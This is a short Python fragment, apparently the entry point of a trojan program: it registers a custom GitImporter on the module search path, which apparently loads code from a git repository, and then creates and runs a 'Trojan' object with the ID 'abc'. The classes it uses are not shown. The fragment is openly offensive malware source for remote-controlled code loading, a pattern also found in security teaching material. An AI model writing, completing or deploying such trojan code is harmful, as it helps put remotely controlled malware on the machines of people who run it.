if __name__ == '__main__':
    # Add the GitImporter to the system's module search path
    sys.meta_path.append(GitImporter())
    # Create a Trojan instance with a specific ID and run it
    trojan = Trojan('abc')
    trojan.run()
